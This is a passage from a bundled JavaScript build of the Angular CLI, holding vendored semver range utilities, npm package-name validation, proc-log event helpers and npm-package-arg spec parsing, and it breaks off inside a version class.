  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-version.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var gt = require_gt();
    var minVersion = (range, loose) => {
      range = new Range(range, loose);
      let minver = new SemVer("0.0.0");
      if (range.test(minver)) {
        return minver;
      }
      minver = new SemVer("0.0.0-0");
      if (range.test(minver)) {
        return minver;
      }
      minver = null;
      for (let i = 0; i < range.set.length; ++i) {
        const comparators = range.set[i];
        let setMin = null;
        comparators.forEach((comparator) => {
          const compver = new SemVer(comparator.semver.version);
          switch (comparator.operator) {
            case ">":
              if (compver.prerelease.length === 0) {
                compver.patch++;
              } else {
                compver.prerelease.push(0);
              }
              compver.raw = compver.format();
            /* fallthrough */
            case "":
            case ">=":
              if (!setMin || gt(compver, setMin)) {
                setMin = compver;
              }
              break;
            case "<":
            case "<=":
              break;
            /* istanbul ignore next */
            default:
              throw new Error(`Unexpected operation: ${comparator.operator}`);
          }
        });
        if (setMin && (!minver || gt(minver, setMin))) {
          minver = setMin;
        }
      }
      if (minver && range.test(minver)) {
        return minver;
      }
      return null;
    };
    module2.exports = minVersion;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/valid.js
var require_valid2 = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/valid.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var validRange2 = (range, options) => {
      try {
        return new Range(range, options).range || "*";
      } catch (er) {
        return null;
      }
    };
    module2.exports = validRange2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/outside.js
var require_outside = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/outside.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Comparator = require_comparator();
    var { ANY } = Comparator;
    var Range = require_range();
    var satisfies2 = require_satisfies();
    var gt = require_gt();
    var lt = require_lt();
    var lte2 = require_lte();
    var gte2 = require_gte();
    var outside = (version, range, hilo, options) => {
      version = new SemVer(version, options);
      range = new Range(range, options);
      let gtfn, ltefn, ltfn, comp, ecomp;
      switch (hilo) {
        case ">":
          gtfn = gt;
          ltefn = lte2;
          ltfn = lt;
          comp = ">";
          ecomp = ">=";
          break;
        case "<":
          gtfn = lt;
          ltefn = gte2;
          ltfn = gt;
          comp = "<";
          ecomp = "<=";
          break;
        default:
          throw new TypeError('Must provide a hilo val of "<" or ">"');
      }
      if (satisfies2(version, range, options)) {
        return false;
      }
      for (let i = 0; i < range.set.length; ++i) {
        const comparators = range.set[i];
        let high = null;
        let low = null;
        comparators.forEach((comparator) => {
          if (comparator.semver === ANY) {
            comparator = new Comparator(">=0.0.0");
          }
          high = high || comparator;
          low = low || comparator;
          if (gtfn(comparator.semver, high.semver, options)) {
            high = comparator;
          } else if (ltfn(comparator.semver, low.semver, options)) {
            low = comparator;
          }
        });
        if (high.operator === comp || high.operator === ecomp) {
          return false;
        }
        if ((!low.operator || low.operator === comp) && ltefn(version, low.semver)) {
          return false;
        } else if (low.operator === ecomp && ltfn(version, low.semver)) {
          return false;
        }
      }
      return true;
    };
    module2.exports = outside;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/gtr.js
var require_gtr = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/gtr.js"(exports2, module2) {
    "use strict";
    var outside = require_outside();
    var gtr2 = (version, range, options) => outside(version, range, ">", options);
    module2.exports = gtr2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/ltr.js
var require_ltr = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/ltr.js"(exports2, module2) {
    "use strict";
    var outside = require_outside();
    var ltr = (version, range, options) => outside(version, range, "<", options);
    module2.exports = ltr;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/intersects.js
var require_intersects = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/intersects.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var intersects = (r1, r2, options) => {
      r1 = new Range(r1, options);
      r2 = new Range(r2, options);
      return r1.intersects(r2, options);
    };
    module2.exports = intersects;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/simplify.js
var require_simplify = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/simplify.js"(exports2, module2) {
    "use strict";
    var satisfies2 = require_satisfies();
    var compare3 = require_compare();
    module2.exports = (versions, range, options) => {
      const set = [];
      let first = null;
      let prev = null;
      const v = versions.sort((a, b) => compare3(a, b, options));
      for (const version of v) {
        const included = satisfies2(version, range, options);
        if (included) {
          prev = version;
          if (!first) {
            first = version;
          }
        } else {
          if (prev) {
            set.push([first, prev]);
          }
          prev = null;
          first = null;
        }
      }
      if (first) {
        set.push([first, null]);
      }
      const ranges = [];
      for (const [min, max] of set) {
        if (min === max) {
          ranges.push(min);
        } else if (!max && min === v[0]) {
          ranges.push("*");
        } else if (!max) {
          ranges.push(`>=${min}`);
        } else if (min === v[0]) {
          ranges.push(`<=${max}`);
        } else {
          ranges.push(`${min} - ${max}`);
        }
      }
      const simplified = ranges.join(" || ");
      const original = typeof range.raw === "string" ? range.raw : String(range);
      return simplified.length < original.length ? simplified : range;
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/subset.js
var require_subset = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/subset.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var Comparator = require_comparator();
    var { ANY } = Comparator;
    var satisfies2 = require_satisfies();
    var compare3 = require_compare();
    var subset = (sub, dom, options = {}) => {
      if (sub === dom) {
        return true;
      }
      sub = new Range(sub, options);
      dom = new Range(dom, options);
      let sawNonNull = false;
      OUTER: for (const simpleSub of sub.set) {
        for (const simpleDom of dom.set) {
          const isSub = simpleSubset(simpleSub, simpleDom, options);
          sawNonNull = sawNonNull || isSub !== null;
          if (isSub) {
            continue OUTER;
          }
        }
        if (sawNonNull) {
          return false;
        }
      }
      return true;
    };
    var minimumVersionWithPreRelease = [new Comparator(">=0.0.0-0")];
    var minimumVersion = [new Comparator(">=0.0.0")];
    var simpleSubset = (sub, dom, options) => {
      if (sub === dom) {
        return true;
      }
      if (sub.length === 1 && sub[0].semver === ANY) {
        if (dom.length === 1 && dom[0].semver === ANY) {
          return true;
        } else if (options.includePrerelease) {
          sub = minimumVersionWithPreRelease;
        } else {
          sub = minimumVersion;
        }
      }
      if (dom.length === 1 && dom[0].semver === ANY) {
        if (options.includePrerelease) {
          return true;
        } else {
          dom = minimumVersion;
        }
      }
      const eqSet = /* @__PURE__ */ new Set();
      let gt, lt;
      for (const c of sub) {
        if (c.operator === ">" || c.operator === ">=") {
          gt = higherGT(gt, c, options);
        } else if (c.operator === "<" || c.operator === "<=") {
          lt = lowerLT(lt, c, options);
        } else {
          eqSet.add(c.semver);
        }
      }
      if (eqSet.size > 1) {
        return null;
      }
      let gtltComp;
      if (gt && lt) {
        gtltComp = compare3(gt.semver, lt.semver, options);
        if (gtltComp > 0) {
          return null;
        } else if (gtltComp === 0 && (gt.operator !== ">=" || lt.operator !== "<=")) {
          return null;
        }
      }
      for (const eq of eqSet) {
        if (gt && !satisfies2(eq, String(gt), options)) {
          return null;
        }
        if (lt && !satisfies2(eq, String(lt), options)) {
          return null;
        }
        for (const c of dom) {
          if (!satisfies2(eq, String(c), options)) {
            return false;
          }
        }
        return true;
      }
      let higher, lower;
      let hasDomLT, hasDomGT;
      let needDomLTPre = lt && !options.includePrerelease && lt.semver.prerelease.length ? lt.semver : false;
      let needDomGTPre = gt && !options.includePrerelease && gt.semver.prerelease.length ? gt.semver : false;
      if (needDomLTPre && needDomLTPre.prerelease.length === 1 && lt.operator === "<" && needDomLTPre.prerelease[0] === 0) {
        needDomLTPre = false;
      }
      for (const c of dom) {
        hasDomGT = hasDomGT || c.operator === ">" || c.operator === ">=";
        hasDomLT = hasDomLT || c.operator === "<" || c.operator === "<=";
        if (gt) {
          if (needDomGTPre) {
            if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomGTPre.major && c.semver.minor === needDomGTPre.minor && c.semver.patch === needDomGTPre.patch) {
              needDomGTPre = false;
            }
          }
          if (c.operator === ">" || c.operator === ">=") {
            higher = higherGT(gt, c, options);
            if (higher === c && higher !== gt) {
              return false;
            }
          } else if (gt.operator === ">=" && !c.test(gt.semver)) {
            return false;
          }
        }
        if (lt) {
          if (needDomLTPre) {
            if (c.semver.prerelease && c.semver.prerelease.length && c.semver.major === needDomLTPre.major && c.semver.minor === needDomLTPre.minor && c.semver.patch === needDomLTPre.patch) {
              needDomLTPre = false;
            }
          }
          if (c.operator === "<" || c.operator === "<=") {
            lower = lowerLT(lt, c, options);
            if (lower === c && lower !== lt) {
              return false;
            }
          } else if (lt.operator === "<=" && !c.test(lt.semver)) {
            return false;
          }
        }
        if (!c.operator && (lt || gt) && gtltComp !== 0) {
          return false;
        }
      }
      if (gt && hasDomLT && !lt && gtltComp !== 0) {
        return false;
      }
      if (lt && hasDomGT && !gt && gtltComp !== 0) {
        return false;
      }
      if (needDomGTPre || needDomLTPre) {
        return false;
      }
      return true;
    };
    var higherGT = (a, b, options) => {
      if (!a) {
        return b;
      }
      const comp = compare3(a.semver, b.semver, options);
      return comp > 0 ? a : comp < 0 ? b : b.operator === ">" && a.operator === ">=" ? b : a;
    };
    var lowerLT = (a, b, options) => {
      if (!a) {
        return b;
      }
      const comp = compare3(a.semver, b.semver, options);
      return comp < 0 ? a : comp > 0 ? b : b.operator === "<" && a.operator === "<=" ? b : a;
    };
    module2.exports = subset;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/index.js
var require_semver2 = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/index.js"(exports2, module2) {
    "use strict";
    var internalRe = require_re();
    var constants2 = require_constants();
    var SemVer = require_semver();
    var identifiers = require_identifiers();
    var parse3 = require_parse();
    var valid5 = require_valid();
    var clean = require_clean();
    var inc = require_inc();
    var diff2 = require_diff();
    var major = require_major();
    var minor = require_minor();
    var patch = require_patch();
    var prerelease = require_prerelease();
    var compare3 = require_compare();
    var rcompare = require_rcompare();
    var compareLoose = require_compare_loose();
    var compareBuild = require_compare_build();
    var sort = require_sort();
    var rsort2 = require_rsort();
    var gt = require_gt();
    var lt = require_lt();
    var eq = require_eq();
    var neq = require_neq();
    var gte2 = require_gte();
    var lte2 = require_lte();
    var cmp = require_cmp();
    var coerce2 = require_coerce();
    var truncate = require_truncate();
    var Comparator = require_comparator();
    var Range = require_range();
    var satisfies2 = require_satisfies();
    var toComparators = require_to_comparators();
    var maxSatisfying2 = require_max_satisfying();
    var minSatisfying = require_min_satisfying();
    var minVersion = require_min_version();
    var validRange2 = require_valid2();
    var outside = require_outside();
    var gtr2 = require_gtr();
    var ltr = require_ltr();
    var intersects = require_intersects();
    var simplifyRange = require_simplify();
    var subset = require_subset();
    module2.exports = {
      parse: parse3,
      valid: valid5,
      clean,
      inc,
      diff: diff2,
      major,
      minor,
      patch,
      prerelease,
      compare: compare3,
      rcompare,
      compareLoose,
      compareBuild,
      sort,
      rsort: rsort2,
      gt,
      lt,
      eq,
      neq,
      gte: gte2,
      lte: lte2,
      cmp,
      coerce: coerce2,
      truncate,
      Comparator,
      Range,
      satisfies: satisfies2,
      toComparators,
      maxSatisfying: maxSatisfying2,
      minSatisfying,
      minVersion,
      validRange: validRange2,
      outside,
      gtr: gtr2,
      ltr,
      intersects,
      simplifyRange,
      subset,
      SemVer,
      re: internalRe.re,
      src: internalRe.src,
      tokens: internalRe.t,
      SEMVER_SPEC_VERSION: constants2.SEMVER_SPEC_VERSION,
      RELEASE_TYPES: constants2.RELEASE_TYPES,
      compareIdentifiers: identifiers.compareIdentifiers,
      rcompareIdentifiers: identifiers.rcompareIdentifiers
    };
  }
});

// node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/builtin-modules.json
var require_builtin_modules = __commonJS({
  "node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/builtin-modules.json"(exports2, module2) {
    module2.exports = ["_http_agent", "_http_client", "_http_common", "_http_incoming", "_http_outgoing", "_http_server", "_stream_duplex", "_stream_passthrough", "_stream_readable", "_stream_transform", "_stream_wrap", "_stream_writable", "_tls_common", "_tls_wrap", "assert", "assert/strict", "async_hooks", "buffer", "child_process", "cluster", "console", "constants", "crypto", "dgram", "diagnostics_channel", "dns", "dns/promises", "domain", "events", "fs", "fs/promises", "http", "http2", "https", "inspector", "inspector/promises", "module", "net", "os", "path", "path/posix", "path/win32", "perf_hooks", "process", "punycode", "querystring", "readline", "readline/promises", "repl", "stream", "stream/consumers", "stream/promises", "stream/web", "string_decoder", "sys", "timers", "timers/promises", "tls", "trace_events", "tty", "url", "util", "util/types", "v8", "vm", "wasi", "worker_threads", "zlib", "node:sea", "node:sqlite", "node:test", "node:test/reporters"];
  }
});

// node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/index.js
var require_lib2 = __commonJS({
  "node_modules/.pnpm/validate-npm-package-name@8.0.0/node_modules/validate-npm-package-name/lib/index.js"(exports2, module2) {
    "use strict";
    var builtins = require_builtin_modules();
    var scopedPackagePattern = new RegExp("^(?:@([^/]+?)[/])?([^/]+?)$");
    var exclusionList = [
      "node_modules",
      "favicon.ico"
    ];
    function validate(name) {
      var warnings = [];
      var errors = [];
      if (name === null) {
        errors.push("name cannot be null");
        return done(warnings, errors);
      }
      if (name === void 0) {
        errors.push("name cannot be undefined");
        return done(warnings, errors);
      }
      if (typeof name !== "string") {
        errors.push("name must be a string");
        return done(warnings, errors);
      }
      if (!name.length) {
        errors.push("name length must be greater than zero");
      }
      if (name.startsWith(".")) {
        errors.push("name cannot start with a period");
      }
      if (name.startsWith("-")) {
        errors.push("name cannot start with a hyphen");
      }
      if (name.match(/^_/)) {
        errors.push("name cannot start with an underscore");
      }
      if (name.trim() !== name) {
        errors.push("name cannot contain leading or trailing spaces");
      }
      exclusionList.forEach(function(excludedName) {
        if (name.toLowerCase() === excludedName) {
          errors.push(excludedName + " is not a valid package name");
        }
      });
      if (builtins.includes(name.toLowerCase())) {
        warnings.push(name + " is a core module name");
      }
      if (name.length > 214) {
        warnings.push("name can no longer contain more than 214 characters");
      }
      if (name.toLowerCase() !== name) {
        warnings.push("name can no longer contain capital letters");
      }
      if (/[~'!()*]/.test(name.split("/").slice(-1)[0])) {
        warnings.push(`name can no longer contain special characters ("~'!()*")`);
      }
      if (encodeURIComponent(name) !== name) {
        var nameMatch = name.match(scopedPackagePattern);
        if (nameMatch) {
          var user = nameMatch[1];
          var pkg = nameMatch[2];
          if (pkg.startsWith(".")) {
            errors.push("name cannot start with a period");
          }
          if (encodeURIComponent(user) === user && encodeURIComponent(pkg) === pkg) {
            return done(warnings, errors);
          }
        }
        errors.push("name can only contain URL-friendly characters");
      }
      return done(warnings, errors);
    }
    var done = function(warnings, errors) {
      var result = {
        validForNewPackages: errors.length === 0 && warnings.length === 0,
        validForOldPackages: errors.length === 0,
        warnings,
        errors
      };
      if (!result.warnings.length) {
        delete result.warnings;
      }
      if (!result.errors.length) {
        delete result.errors;
      }
      return result;
    };
    module2.exports = validate;
  }
});

// node_modules/.pnpm/proc-log@7.0.0/node_modules/proc-log/lib/index.js
var require_lib3 = __commonJS({
  "node_modules/.pnpm/proc-log@7.0.0/node_modules/proc-log/lib/index.js"(exports2, module2) {
    var META = /* @__PURE__ */ Symbol("proc-log.meta");
    module2.exports = {
      META,
      output: {
        LEVELS: [
          "standard",
          "error",
          "buffer",
          "flush"
        ],
        KEYS: {
          standard: "standard",
          error: "error",
          buffer: "buffer",
          flush: "flush"
        },
        standard: function(...args) {
          return process.emit("output", "standard", ...args);
        },
        error: function(...args) {
          return process.emit("output", "error", ...args);
        },
        buffer: function(...args) {
          return process.emit("output", "buffer", ...args);
        },
        flush: function(...args) {
          return process.emit("output", "flush", ...args);
        }
      },
      log: {
        LEVELS: [
          "notice",
          "error",
          "warn",
          "info",
          "verbose",
          "http",
          "silly",
          "timing",
          "pause",
          "resume"
        ],
        KEYS: {
          notice: "notice",
          error: "error",
          warn: "warn",
          info: "info",
          verbose: "verbose",
          http: "http",
          silly: "silly",
          timing: "timing",
          pause: "pause",
          resume: "resume"
        },
        error: function(...args) {
          return process.emit("log", "error", ...args);
        },
        notice: function(...args) {
          return process.emit("log", "notice", ...args);
        },
        warn: function(...args) {
          return process.emit("log", "warn", ...args);
        },
        info: function(...args) {
          return process.emit("log", "info", ...args);
        },
        verbose: function(...args) {
          return process.emit("log", "verbose", ...args);
        },
        http: function(...args) {
          return process.emit("log", "http", ...args);
        },
        silly: function(...args) {
          return process.emit("log", "silly", ...args);
        },
        timing: function(...args) {
          return process.emit("log", "timing", ...args);
        },
        pause: function() {
          return process.emit("log", "pause");
        },
        resume: function() {
          return process.emit("log", "resume");
        }
      },
      time: {
        LEVELS: [
          "start",
          "end"
        ],
        KEYS: {
          start: "start",
          end: "end"
        },
        start: function(name, fn) {
          process.emit("time", "start", name);
          function end() {
            return process.emit("time", "end", name);
          }
          if (typeof fn === "function") {
            const res = fn();
            if (res && res.finally) {
              return res.finally(end);
            }
            end();
            return res;
          }
          return end;
        },
        end: function(name) {
          return process.emit("time", "end", name);
        }
      },
      input: {
        LEVELS: [
          "start",
          "end",
          "read"
        ],
        KEYS: {
          start: "start",
          end: "end",
          read: "read"
        },
        start: function(...args) {
          let fn;
          if (typeof args[0] === "function") {
            fn = args.shift();
          }
          process.emit("input", "start", ...args);
          function end() {
            return process.emit("input", "end", ...args);
          }
          if (typeof fn === "function") {
            const res = fn();
            if (res && res.finally) {
              return res.finally(end);
            }
            end();
            return res;
          }
          return end;
        },
        end: function(...args) {
          return process.emit("input", "end", ...args);
        },
        read: function(...args) {
          let resolve2, reject;
          const promise = new Promise((_resolve, _reject) => {
            resolve2 = _resolve;
            reject = _reject;
          });
          process.emit("input", "read", resolve2, reject, ...args);
          return promise;
        }
      }
    };
  }
});

// node_modules/.pnpm/npm-package-arg@14.0.0/node_modules/npm-package-arg/lib/npa.js
var require_npa = __commonJS({
  "node_modules/.pnpm/npm-package-arg@14.0.0/node_modules/npm-package-arg/lib/npa.js"(exports2, module2) {
    "use strict";
    var isWindows = process.platform === "win32";
    var { URL: URL2 } = require("node:url");
    var path2 = isWindows ? require("node:path/win32") : require("node:path");
    var { homedir } = require("node:os");
    var HostedGit = require_lib();
    var semver3 = require_semver2();
    var validatePackageName = require_lib2();
    var { log: log2 } = require_lib3();
    var hasSlashes = isWindows ? /\\|[/]/ : /[/]/;
    var isURL = /^(?:git[+])?[a-z]+:/i;
    var isGit = /^[^@]+@[^:.]+\.[^:]+:.+$/i;
    var isFileType = /[.](?:tgz|tar\.gz|tar)$/i;
    var isPortNumber = /:[0-9]+(\/|$)/i;
    var isWindowsFile = /^(?:[.]|~[/]|[/\\]|[a-zA-Z]:)/;
    var isPosixFile = /^(?:[.]|~[/]|[/]|[a-zA-Z]:)/;
    var defaultRegistry = "https://registry.npmjs.org";
    function npa3(arg, where) {
      let name;
      let spec;
      if (typeof arg === "object") {
        if (arg instanceof Result && (!where || where === arg.where)) {
          return arg;
        } else if (arg.name && arg.rawSpec) {
          return npa3.resolve(arg.name, arg.rawSpec, where || arg.where);
        } else {
          return npa3(arg.raw, where || arg.where);
        }
      }
      const nameEndsAt = arg.indexOf("@", 1);
      const namePart = nameEndsAt > 0 ? arg.slice(0, nameEndsAt) : arg;
      if (isURL.test(arg)) {
        spec = arg;
      } else if (isGit.test(arg)) {
        spec = `git+ssh://${arg}`;
      } else if (!namePart.startsWith("@") && (hasSlashes.test(namePart) || isFileType.test(namePart))) {
        spec = arg;
      } else if (nameEndsAt > 0) {
        name = namePart;
        spec = arg.slice(nameEndsAt + 1) || "*";
      } else {
        const valid5 = validatePackageName(arg);
        if (valid5.validForOldPackages) {
          name = arg;
          spec = "*";
        } else {
          spec = arg;
        }
      }
      return resolve2(name, spec, where, arg);
    }
    function isFileSpec(spec) {
      if (!spec) {
        return false;
      }
      if (spec.toLowerCase().startsWith("file:")) {
        return true;
      }
      if (isWindows) {
        return isWindowsFile.test(spec);
      }
      return isPosixFile.test(spec);
    }
    function isAliasSpec(spec) {
      if (!spec) {
        return false;
      }
      return spec.toLowerCase().startsWith("npm:");
    }
    function resolve2(name, spec, where, arg) {
      const res = new Result({
        raw: arg,
        name,
        rawSpec: spec,
        fromArgument: arg != null
      });
      if (name) {
        res.name = name;
      }
      if (!where) {
        where = process.cwd();
      }
      if (isFileSpec(spec)) {
        return fromFile(res, where);
      } else if (isAliasSpec(spec)) {
        return fromAlias(res, where);
      }
      const hosted = HostedGit.fromUrl(spec, {
        noGitPlus: true,
        noCommittish: true
      });
      if (hosted) {
        return fromHostedGit(res, hosted);
      } else if (spec && isURL.test(spec)) {
        return fromURL(res);
      } else if (spec && (hasSlashes.test(spec) || isFileType.test(spec))) {
        return fromFile(res, where);
      } else {
        return fromRegistry(res);
      }
    }
    function toPurl(arg, reg = defaultRegistry) {
      const res = npa3(arg);
      if (res.type !== "version") {
        throw invalidPurlType(res.type, res.raw);
      }
      let purl = "pkg:npm/" + res.name.replace(/^@/, "%40") + "@" + res.rawSpec;
      if (reg !== defaultRegistry) {
        purl += "?repository_url=" + reg;
      }
      return purl;
    }
    function invalidPackageName(name, valid5, raw) {
      const err = new Error(`Invalid package name "${name}" of package "${raw}": ${valid5.errors.join("; ")}.`);
      err.code = "EINVALIDPACKAGENAME";
      return err;
    }
    function invalidTagName(name, raw) {
      const err = new Error(`Invalid tag name "${name}" of package "${raw}": Tags may not have any characters that encodeURIComponent encodes.`);
      err.code = "EINVALIDTAGNAME";
      return err;
    }
    function invalidPurlType(type, raw) {
      const err = new Error(`Invalid type "${type}" of package "${raw}": Purl can only be generated for "version" types.`);
      err.code = "EINVALIDPURLTYPE";
      return err;
    }
    var Result = class {
      constructor(opts) {
        this.type = opts.type;
        this.registry = opts.registry;
        this.where = opts.where;
        if (opts.raw == null) {
          this.raw = opts.name ? `${opts.name}@${opts.rawSpec}` : opts.rawSpec;
        } else {
          this.raw = opts.raw;
        }
        this.name = void 0;
        this.escapedName = void 0;
        this.scope = void 0;
        this.rawSpec = opts.rawSpec || "";
        this.saveSpec = opts.saveSpec;
        this.fetchSpec = opts.fetchSpec;
        if (opts.name) {
          this.setName(opts.name);
        }
        this.gitRange = opts.gitRange;
        this.gitCommittish = opts.gitCommittish;
        this.gitSubdir = opts.gitSubdir;
        this.hosted = opts.hosted;
      }
      // TODO move this to a getter/setter in a semver major
      setName(name) {
        const valid5 = validatePackageName(name);
        if (!valid5.validForOldPackages) {
          throw invalidPackageName(name, valid5, this.raw);
        }
        this.name = name;
        this.scope = name[0] === "@" ? name.slice(0, name.indexOf("/")) : void 0;
        this.escapedName = name.replace("/", "%2f");
        return this;
      }
      toString() {
        const full = [];
        if (this.name != null && this.name !== "") {
          full.push(this.name);
        }
        const spec = this.saveSpec || this.fetchSpec || this.rawSpec;
        if (spec != null && spec !== "") {
          full.push(spec);
        }
        return full.length ? full.join("@") : this.raw;
      }
      toJSON() {
        const result = Object.assign({}, this);
        delete result.hosted;
        return result;
      }
    };
    function setGitAttrs(res, committish) {
      if (!committish) {
        res.gitCommittish = null;
        return;
      }
      for (const part of committish.split("::")) {
        if (!part.includes(":")) {
          if (res.gitRange) {
            throw new Error("cannot override existing semver range with a committish");
          }
          if (res.gitCommittish) {
            throw new Error("cannot override existing committish with a second committish");
          }
          res.gitCommittish = part;
          continue;
        }
        const [name, value] = part.split(":");
        if (name === "semver") {
          if (res.gitCommittish) {
            throw new Error("cannot override existing committish with a semver range");
          }
          if (res.gitRange) {
            throw new Error("cannot override existing semver range with a second semver range");
          }
          res.gitRange = decodeURIComponent(value);
          continue;
        }
        if (name === "path") {
          if (res.gitSubdir) {
            throw new Error("cannot override existing path with a second path");
          }
          res.gitSubdir = `/${value}`;
          continue;
        }
        log2.warn("npm-package-arg", `ignoring unknown key "${name}"`);
      }
    }
    var encodedPathChars = /* @__PURE__ */ new Map([
      ["\0", "%00"],
      ["	", "%09"],
      ["\n", "%0A"],
      ["\r", "%0D"],
      [" ", "%20"],
      ['"', "%22"],
      ["#", "%23"],
      ["%", "%25"],
      ["?", "%3F"],
      ["[", "%5B"],
      ["\\", isWindows ? "/" : "%5C"],
      ["]", "%5D"],
      ["^", "%5E"],
      ["|", "%7C"],
      ["~", "%7E"]
    ]);
    function pathToFileURL(str) {
      let result = "";
      for (let i = 0; i < str.length; i++) {
        result = `${result}${encodedPathChars.get(str[i]) ?? str[i]}`;
      }
      if (result.startsWith("file:")) {
        return result;
      }
      return `file:${result}`;
    }
    function fromFile(res, where) {
      res.type = isFileType.test(res.rawSpec) ? "file" : "directory";
      res.where = where;
      let rawSpec = pathToFileURL(res.rawSpec);
      if (rawSpec.startsWith("file:/")) {
        if (/^file:\/\/[^/]/.test(rawSpec)) {
          rawSpec = `file:/${rawSpec.slice(5)}`;
        }
        if (/^\/{1,3}\.\.?(\/|$)/.test(rawSpec.slice(5))) {
          rawSpec = rawSpec.replace(/^file:\/{1,3}/, "file:");
        }
      }
      let resolvedUrl;
      let specUrl;
      try {
        resolvedUrl = new URL2(rawSpec, `${pathToFileURL(path2.resolve(where))}/`);
        specUrl = new URL2(rawSpec);
      } catch (originalError) {
        const er = new Error("Invalid file: URL, must comply with RFC 8089");
        throw Object.assign(er, {
          raw: res.rawSpec,
          spec: res,
          where,
          originalError
        });
      }
      let specPath = decodeURIComponent(specUrl.pathname);
      let resolvedPath = decodeURIComponent(resolvedUrl.pathname);
      if (isWindows) {
        specPath = specPath.replace(/^\/+([a-z]:\/)/i, "$1");
        resolvedPath = resolvedPath.replace(/^\/+([a-z]:\/)/i, "$1");
      }
      if (/^\/~(\/|$)/.test(specPath)) {
        res.saveSpec = `file:${specPath.substr(1)}`;
        resolvedPath = path2.resolve(homedir(), specPath.substr(3));
      } else if (!path2.isAbsolute(rawSpec.slice(5))) {
        res.saveSpec = `file:${path2.relative(where, resolvedPath)}`;
      } else {
        res.saveSpec = `file:${path2.resolve(resolvedPath)}`;
      }
      res.fetchSpec = path2.resolve(where, resolvedPath);
      res.saveSpec = res.saveSpec.split("\\").join("/");
      if (res.saveSpec.startsWith("file://")) {
        res.saveSpec = `file:/${res.saveSpec.slice(7)}`;
      }
      return res;
    }
    function fromHostedGit(res, hosted) {
      res.type = "git";
      res.hosted = hosted;
      res.saveSpec = hosted.toString({ noGitPlus: false, noCommittish: false });
      res.fetchSpec = hosted.getDefaultRepresentation() === "shortcut" ? null : hosted.toString();
      setGitAttrs(res, hosted.committish);
      return res;
    }
    function unsupportedURLType(protocol, spec) {
      const err = new Error(`Unsupported URL Type "${protocol}": ${spec}`);
      err.code = "EUNSUPPORTEDPROTOCOL";
      return err;
    }
    function fromURL(res) {
      let rawSpec = res.rawSpec;
      res.saveSpec = rawSpec;
      if (rawSpec.startsWith("git+ssh:")) {
        const matched = rawSpec.match(/^git\+ssh:\/\/([^:#]+:[^#]+(?:\.git)?)(?:#(.*))?$/i);
        if (matched && !matched[1].match(isPortNumber)) {
          res.type = "git";
          setGitAttrs(res, matched[2]);
          res.fetchSpec = matched[1];
          return res;
        }
      } else if (rawSpec.startsWith("git+file://")) {
        rawSpec = rawSpec.replace(/\\/g, "/");
      }
      const parsedUrl = new URL2(rawSpec);
      switch (parsedUrl.protocol) {
        case "git:":
        case "git+http:":
        case "git+https:":
        case "git+rsync:":
        case "git+ftp:":
        case "git+file:":
        case "git+ssh:":
          res.type = "git";
          setGitAttrs(res, parsedUrl.hash.slice(1));
          if (parsedUrl.protocol === "git+file:" && /^git\+file:\/\/[a-z]:/i.test(rawSpec)) {
            res.fetchSpec = `git+file://${parsedUrl.host.toLowerCase()}:${parsedUrl.pathname}`;
          } else {
            parsedUrl.hash = "";
            res.fetchSpec = parsedUrl.toString();
          }
          if (res.fetchSpec.startsWith("git+")) {
            res.fetchSpec = res.fetchSpec.slice(4);
          }
          break;
        case "http:":
        case "https:":
          res.type = "remote";
          res.fetchSpec = res.saveSpec;
          break;
        default:
          throw unsupportedURLType(parsedUrl.protocol, rawSpec);
      }
      return res;
    }
    function fromAlias(res, where) {
      const subSpec = npa3(res.rawSpec.substr(4), where);
      if (subSpec.type === "alias") {
        throw new Error("nested aliases not supported");
      }
      if (!subSpec.registry) {
        throw new Error("aliases only work for registry deps");
      }
      if (!subSpec.name) {
        throw new Error("aliases must have a name");
      }
      res.subSpec = subSpec;
      res.registry = true;
      res.type = "alias";
      res.saveSpec = null;
      res.fetchSpec = null;
      return res;
    }
    function fromRegistry(res) {
      res.registry = true;
      const spec = res.rawSpec.trim();
      res.saveSpec = null;
      res.fetchSpec = spec;
      const version = semver3.valid(spec, true);
      const range = semver3.validRange(spec, true);
      if (version) {
        res.type = "version";
      } else if (range) {
        res.type = "range";
      } else {
        if (encodeURIComponent(spec) !== spec) {
          throw invalidTagName(spec, res.raw);
        }
        res.type = "tag";
      }
      return res;
    }
    module2.exports = npa3;
    module2.exports.resolve = resolve2;
    module2.exports.toPurl = toPurl;
    module2.exports.Result = Result;
  }
});

// packages/angular/cli/src/utilities/version.ts
var version_exports = {};
__export(version_exports, {
  VERSION: () => VERSION
});
var Version, VERSION;
var init_version = __esm({
  "packages/angular/cli/src/utilities/version.ts"() {
    "use strict";
    Version = class {
      constructor(full) {
        this.full = full;
        const [major, minor, patch] = full.split("-", 1)[0].split(".", 3);
        this.major = major;
        this.minor = minor;
        this.patch = patch;
      }
